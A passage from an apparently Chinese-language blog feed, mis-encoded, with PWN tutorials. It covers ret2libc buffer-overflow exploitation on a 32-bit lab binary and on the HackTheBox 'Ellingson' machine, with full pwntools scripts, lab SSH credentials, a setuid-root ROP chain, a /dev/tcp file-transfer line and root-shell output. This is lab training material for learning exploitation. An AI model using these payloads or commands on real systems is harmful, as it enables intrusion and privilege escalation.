e.got['puts']\n    main_addr = e.symbols['main']\n    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)\n    p.sendlineafter(\"Can you find it !?\", payload1)\n    libc_start_main_real_addr = u32(p.recv()[0:4])\n    print(f\"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}\")\n    \n    libcbase = libc_start_main_real_addr - libc.sym['puts']\n    print(f\"libcbase = {hex(libcbase)}\")\n    system_real_addr = libcbase + libc.sym['system']\n    print(f\"system_real_addr = {hex(system_real_addr)}\")\n    bin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\n    print(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n    payload2 = b'A' * 104+ p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)\n    p.sendline(payload2)\n    p.interactive()\n    ```\n    \n    è¾“å‡ºï¼ˆæˆåŠŸï¼‰\n    \n    ```bash\n    (pwn) âœ  ret2libc python exp.py\n    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\n        Arch:       i386-32-little\n        RELRO:      Partial RELRO\n        Stack:      No canary found\n        NX:         NX enabled\n        PIE:        No PIE (0x8048000)\n        Stripped:   No\n        Debuginfo:  Yes\n    [+] Starting local process './ret2libc3': pid 6021\n    [*] '/lib32/libc.so.6'\n        Arch:       i386-32-little\n        RELRO:      Full RELRO\n        Stack:      Canary found\n        NX:         NX enabled\n        PIE:        PIE enabled\n    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n      res = self.recvuntil(delim, timeout=timeout)\n    libc_start_main_real_addr = 0xf7d902a0\n    libcbase = 0xf7d14000\n    system_real_addr = 0xf7d66220\n    bin_sh_addr = 0xf7edae52\n    [*] Switching to interactive mode\n    $ id\n    uid=0(root) gid=0(root) ç»„=0(root)\n    ```\n    \n    ä¸ºä»€ä¹ˆç¬¬äºŒæ¬¡è°ƒç”¨æ—¶ä½¿ç”¨`104`æ¥å¡«å……æ ˆè€Œä¸æ˜¯`112`ï¼Ÿ\n    \n    å› ä¸ºç¨‹åºçœŸæ­£çš„å…¥å£æ˜¯`_start`ï¼Œè€Œä¸æ˜¯`main` ï¼Œæˆ‘ä»¬æ¥çœ‹`_start`\n    \n    ![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image21.png)\n    \n    è°ƒç”¨`main`å‰ä¼šå…ˆè°ƒç”¨`and     esp, 0FFFFFFF0h` æ¥ä½¿å †æ ˆå¹³è¡¡\n    \n    å¯ä»¥åœ¨ `_start` å¤„æ–­ç‚¹ï¼Œç„¶å`si`æ¥ä¸€æ­¥ä¸€æ­¥è°ƒè¯•æŸ¥çœ‹ `esp` çš„å˜åŒ–\n    \n    ç¬¬ä¸€æ¬¡æˆ‘ä»¬è¿è¡Œ`payload1`çš„æ—¶å€™æ˜¯ç›´æ¥ä»`_start`å¼€å§‹è¿è¡Œçš„ï¼Œä¼šç»è¿‡`and     esp, 0FFFFFFF0h` ä½¿å †æ ˆå¹³è¡¡ï¼Œä½¿æ ˆ `+8` å¾—åˆ°`112` ï¼Œä½†æ˜¯æˆ‘ä»¬ç¬¬äºŒæ¬¡æ‰§è¡Œ`payload2`ä¸æ˜¯ä»`_start`å¼€å§‹ï¼Œç›´æ¥ä»`main`å¼€å§‹ï¼Œ`and`ä¸æ‰§è¡Œï¼Œæ‰€ä»¥æ²¡æœ‰`+8` ï¼Œæ‰€ä»¥æ­¤æ—¶espåˆ°è¦†ç›–è¿”å›åœ°å€ä¸º`112-8=104`\n    \n    > https://xz.aliyun.com/news/14087\n    > \n    \n    ä¹Ÿå¯ä»¥è¯´ç¬¬ä¸€æ¬¡è¿è¡Œ `_start` + `main` ä¸€å…± `112` ï¼Œè€Œç¬¬äºŒæ¬¡ç›´æ¥ä»`main`å¼€å§‹ä¸€å…±ç”¨äº†`104`\n    \n\n### æ–¹æ¡ˆ`1`å¤±è´¥çš„åŸå› æ˜¯\n\næ³„éœ²çš„åœ°å€ä¸æ­£ç¡®ï¼ˆåå­—ç¬¦é—®é¢˜ï¼‰\n\n`libc_start_main_real_addr`Â çš„å€¼æ˜¯Â `0x206f4e0a`ã€‚`puts`Â å‡½æ•°æ˜¯ç”¨æ¥æ‰“å°å­—ç¬¦ä¸²çš„ï¼Œå®ƒé‡åˆ°Â `\\n`Â (`0x0a`) å°±ä¼šåœæ­¢è¯»å–å¹¶è¾“å‡ºæ¢è¡Œç¬¦ï¼Œç„¶åè¿”å›ã€‚çœ‹ä¸€ä¸‹è¿™ä¸ªåœ°å€Â `0x206f4e0a`ï¼Œå®ƒçš„æœ€åä¸€ä¸ªå­—èŠ‚æ˜¯Â `0a`ï¼Œä¹Ÿå°±æ˜¯æ¢è¡Œç¬¦Â `\\n`ã€‚è¿™å°±å¯¼è‡´è§£åŒ…å‡ºæ¥çš„Â `libc_start_main_real_addr`Â æ˜¯ä¸€ä¸ªå®Œå…¨é”™è¯¯çš„å€¼Â `0x206f4e0a`\n\n\n### ret2libc - x64\n\næ¥è‡ª `HackTheBox - Ellingson` \n\nè¿è¡Œå®ƒçš„æ—¶å€™ï¼Œä¼šè®©ä½ è¾“å…¥å¯†ç \n\n```bash\nmargo@ellingson:~$ garbage\nEnter access password: 111111111111111111111111111111111111111111111111111111\n\naccess denied.\n```\n\næ‹‰å‡ºå»é€†å‘çœ‹ä¸€çœ¼\n\n```bash\nint __fastcall __noreturn main(int argc, const char **argv, const char **envp)\n{\n  int v3; // [rsp+8h] [rbp-8h] BYREF\n  unsigned int v4; // [rsp+Ch] [rbp-4h]\n\n  v4 = check_user(argc, argv, envp);\n  set_username(v4);\n  if ( !(unsigned int)auth(v4) )\n    exit(-1);\n  puts(\"[+] W0rM || Control Application\");\n  puts(\"[+] ---------------------------\");\n  puts(\"Select Option\");\n  puts(\"1: Check Balance\");\n  puts(\"2: Launch\");\n  puts(\"3: Cancel\");\n  puts(\"4: Exit\");\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        printf(\"> \");\n        __isoc99_scanf(\"%d%*c\", &v3);\n        if ( v3 != 2 )\n          break;\n        launch();\n      }\n      if ( v3 > 2 )\n        break;\n      if ( v3 != 1 )\n        goto LABEL_14;\n      checkbalance();\n    }\n    if ( v3 != 3 )\n    {\n      if ( v3 == 4 )\n        exit(0);\nLABEL_14:\n      puts(\"Unknown option\");\n      exit(-1);\n    }\n    cancel();\n  }\n}\n```\n\næˆ‘ä»¬åœ¨å¼€å§‹è¿è¡Œçš„ `auth` å‡½æ•°ä¸­å‘ç°äº†å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´\n\nä¹Ÿå°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥å¯†ç çš„åœ°æ–¹ï¼Œä¼šæœ‰ç¼“å†²åŒºæº¢å‡ºï¼Œ`gets()` å‡½æ•°ä¼šæ— é™åˆ¶åœ°è¯»å–ç”¨æˆ·çš„è¾“å…¥ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ã€‚å¦‚æœæ”»å‡»è€…è¾“å…¥ä¸€ä¸ªè¶…é•¿çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚`200`ä¸ªå­—ç¬¦ï¼‰ï¼Œå¤šå‡ºæ¥çš„`100`ä¸ªå­—ç¬¦å°±ä¼šæº¢å‡ºï¼Œè¦†ç›–æ‰æ ˆä¸Š `s1` ç›¸é‚»çš„å…¶ä»–æ•°æ®ã€‚\n\n```bash\n__int64 __fastcall auth(int a1)\n{\n  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF\n  char s1[100]; // [rsp+80h] [rbp-80h] BYREF\n  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF\n  int v5; // [rsp+F0h] [rbp-10h]\n\n  v5 = a1;\n  strcpy(v4, username);\n  printf(\"Enter access password: \");\n  gets(s1);\n  putchar(10);\n  if ( !strcmp(s1, \"N3veRF3@r1iSh3r3!\") )\n  {\n    strcpy(dest, \"access granted for user: \");\n    strcat(dest, v4);\n    syslog(6, dest);\n    puts(\"access granted.\");\n    return 1LL;\n  }\n  else\n  {\n    puts(\"access denied.\");\n    return 0LL;\n  }\n}\n```\n\n`64`ä½ç¨‹åº\n\n```bash\nâœ  Ellingson file garbage \ngarbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped\n```\n\nä¿æŠ¤æªæ–½æƒ…å†µï¼Œå¼€å¯äº†`NX` \n\n```bash\nâœ  Ellingson checksec garbage \n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n```\n\næ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å¼€å¯äº† `ALSR` ï¼Œå¼€å¯äº†å®Œå…¨`ALSR`\n\n```bash\nmargo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space\n2\n```\n\nè¿™é‡Œè¦ä½¿ç”¨ `ret2libc` æ”»å‡»\n\nå¯»æ‰¾ä¸€ä¸ªçœŸå®çš„åœ°å€ï¼Œé¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹`libc`æ–‡ä»¶\n\n```bash\nmargo@ellingson:~$ ldd /usr/bin/garbage \n        linux-vdso.so.1 (0x00007ffcd37ec000)\n        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)\n        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)\n```\n\nå°†`/lib/x86_64-linux-gnu/libc.so.6`ä¸‹è½½åˆ°é¶æœºä¸­\n\n```bash\n// kali\nâœ  Ellingson nc -lvp 1234 > libc.so.6\n// Machine\nmargo@ellingson:~$ cat /lib/x86_64-linux-gnu/libc.so.6 > /dev/tcp/your-ip/1234\n```\n\né¦–å…ˆåˆ¤æ–­å¡«å……å€¼ï¼Œè¿™é‡Œä½¿ç”¨`garbage` \n\n```bash\n(pwn) âœ  Ellingson pwndbg garbage \npwndbg> cyclic 1024\naaaabaaacaaadaaa...acwaacxaacyaac\npwndbg> run\nStarting program: /root/Desktop/HackTheBox/Ellingson/garbage \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\nEnter access password:aaaabaaacaaadaaa...acwaacxaacyaac\n```\n\nç¨‹åºæœä¸å…¶ç„¶å´©æºƒäº†\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image22.png)\n\nè®¡ç®—åç§»å€¼ï¼Œè¿™é‡Œä½¿ç”¨`msf`\n\n```bash\nâœ  Ellingson /usr/bin/msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag\n```\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image23.png)\n\n```bash\npwndbg> x/xg 0x7fffffffdf58\n0x7fffffffdf58: 0x3765413665413565\n```\n\n```bash\n(pwn) âœ  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 136\n```\n\nå¾—åˆ°åç§»å€¼`136` ï¼ˆPSï¼šè¿™é‡Œä½¿ç”¨`pwndbg`çš„`cyclic`æ— æ³•å¾—åˆ°æ­£ç¡®åç§»å€¼ï¼Œä½†æ˜¯`WP`ä¸­ä½¿ç”¨`gef`ç­‰éƒ½å¯ä»¥å¾ˆå®¹æ˜“å°±å¾—åˆ°åç§»å€¼ï¼‰\n\nå¾—åˆ°åç§»å€¼åï¼Œæˆ‘ä»¬é€‰æ‹©ä¸€ä¸‹è·å¾—å“ªä¸ª`plt`å‡½æ•°çš„çœŸå®åœ°å€\n\n```bash\npwndbg> plt\nSection .plt 0x401020 - 0x401170:\n0x401030: putchar@plt\n0x401040: strcpy@plt\n0x401050: puts@plt\n0x401060: fclose@plt\n0x401070: getpwuid@plt\n0x401080: getuid@plt\n0x401090: printf@plt\n0x4010a0: rewind@plt\n0x4010b0: fgetc@plt\n0x4010c0: read@plt\n0x4010d0: fgets@plt\n0x4010e0: strcmp@plt\n0x4010f0: getchar@plt\n0x401100: gets@plt\n0x401110: syslog@plt\n0x401120: access@plt\n0x401130: fopen@plt\n0x401140: __isoc99_scanf@plt\n0x401150: strcat@plt\n0x401160: exit@plt\n```\n\n`x64` ä¼ å‚éœ€è¦ä½¿ç”¨å¯„å­˜å™¨ï¼Œ`0x000000000040179b` ç¬¦åˆ\n\n```bash\n(pwn) âœ  Ellingson ROPgadget --binary garbage --only \"pop|ret\"\nGadgets information\n============================================================\n0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401798 : pop r14 ; pop r15 ; ret\n0x000000000040179a : pop r15 ; ret\n0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000401239 : pop rbp ; ret\n0x000000000040179b : pop rdi ; ret\n0x0000000000401799 : pop rsi ; pop r15 ; ret\n0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n\nUnique gadgets found: 15\n```\n\nè¿™é‡Œé€‰æ‹©è·å¾—`puts@plt` ï¼Œæˆ‘ä»¬é€šè¿‡`pwn`è¿æ¥`ssh` æ¥è°ƒè¯•\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_add = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_add:{hex(puts_real_add)}\")\n```\n\nè¿è¡Œåæˆ‘ä»¬çš„å¾—åˆ°äº†`put`çš„çœŸå®åœ°å€`0x7f8eed3569c0`\n\n```bash\n(pwn) âœ  Ellingson python exp.py                              \n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21277\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_add = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_add:0x7f8eed3569c0\n```\n\nå¾—åˆ°åŸºåœ°å€ï¼ŒåŸºåœ°å€ = puts å‡½æ•°çœŸå®åœ°å€ - puts å‡½æ•°åç§»åœ°å€\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n```\n\n```bash\n(pwn) âœ  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21460\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7f7ed83509c0\nlibcbase:0x7f7ed82d0000\n```\n\nè·å¾—å…¶ä»–åœ°å€ï¼Œå¾—åˆ°åŸºåœ°å€åï¼Œæˆ‘ä»¬è¦å¾—åˆ° `system` å’Œ `/bin/sh`çš„åœ°å€\n\nå‡½æ•°çœŸå®åœ°å€ = åŸºåœ°å€ + å‡½æ•°åç§»å€¼\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n```\n\n```bash\n(pwn) âœ  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21644\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7f41e478b9c0\nlibcbase:0x7f41e470b000\nsystem_addr:0x7f41e475a440\nbin_sh_addr = 0x7f41e48bee9a/3\n```\n\n`GetShell` ï¼Œå¾—åˆ°éœ€è¦çš„åœ°å€åï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œè·å–`Shell`äº†\n\nå†æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª`ret`æ¥å®ç°å †æ ˆå¹³è¡¡\n\n```bash\n(pwn) âœ  Ellingson ROPgadget --binary garbage --only \"ret\"    \nGadgets information\n============================================================\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n```\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n\nret_addr = 0x0000000000401016\n\npayload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\np.sendline(payload2)\np.interactive()\n```\n\nç„¶åæˆ‘ä»¬è¿è¡Œï¼Œä½†æ˜¯æƒé™åªæ˜¯ `margo`çš„æƒé™\n\n```bash\n$ $ id\nuid=1002(margo) gid=1002(margo) groups=1002(margo)\n```\n\n`GetRootShell`ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œå°†`shell`æƒé™æå‡ï¼Œå¯ä»¥ä½¿ç”¨`setuid`\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n\nret_addr = 0x0000000000401016\n\nsetuid_addr = libcbase + libc.sym['setuid']\n\npayload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\n\np.sendline(payload2)\np.interactive()\n```\n\nè¿è¡Œè·å¾— `RootShell`\n\n```bash\n(pwn) âœ  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 22208\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7fc6c64fd9c0\nlibcbase:0x7fc6c647d000\nsystem_addr:0x7fc6c64cc440\nbin_sh_addr = 0x7fc6c6630e9a\n[*] Switching to interactive mode\n\nEnter access password: \naccess denied.\n# $ id\nuid=0(root) gid=1002(margo) groups=1002(margo)\n```",
            "url": "https://www.sunsetaction.top/2025/06/15/PWN - åŸºæœ¬ROP",
            "title": "PWN - åŸºæœ¬ROP",
            "summary": "PWN åŸºæœ¬ROP https://ctf wiki.org/pwn/linux/user mode/stackoverflow/x86/basic rop/ è¿™é‡Œç”¨åˆ°çš„æ‰€æœ‰é¢˜ç›®ï¼šhttps://github.com/ctf wiki/ctf challenges/tree/master/pwn/l...",
            "date_modified": "2025-06-14T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "äºŒè¿›åˆ¶å®‰å…¨",
                "PWN",
                "ROP",
                "ret2text",
                "ret2shellcode",
                "ret2syscall",
                "ret2libc"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/15/HackTheBoxMachine - Ellingson",
            "content_html": "\n# Machine - Ellingson\n\n> https://app.hackthebox.com/machines/Ellingson | `Linux`Â |Â `Hard`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image.png)\n\n## Recon\n\n```bash\nâœ  Ellingson nmap -sT -min-rate 5000 10.10.10.139\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST\nNmap scan report for 10.10.10.139\nHost is up (0.062s latency).\nNot shown: 886 closed tcp ports (conn-refused), 112 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.59 seconds\n```\n\n```bash\nâœ  Ellingson nmap -sT -A -p 22,80 10.10.10.139   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST\nNmap scan report for 10.10.10.139\nHost is up (0.056s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)\n|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)\n|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n| http-title: Ellingson Mineral Corp\n|_Requested resource was http://10.10.10.139/index\n|_http-server-header: nginx/1.14.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.14\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   324.20 ms 10.10.16.1\n2   43.94 ms  10.10.10.139\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.57 seconds\n```\n\nè®¿é—®`HTTP`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image1.png)\n\nå†…å®¹å‘Šè¯‰æˆ‘ä»¬ä»–ä»¬è¢«`Ellingson`ç—…æ¯’ç»™å‹’ç´¢äº†ï¼Œå¹¶ä¸”çŸ­æ—¶é—´å†…ä¸èƒ½è®¿é—®æœåŠ¡è¶…è¿‡äº”æ¬¡ï¼Œå¦åˆ™ä¼šè¢«`ban` (ç›®å½•æ‰«æä¹Ÿä¸è¡Œ)\n\nå¾—åˆ°å¸¸è§å¯†ç ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨å¼±å¯†ç 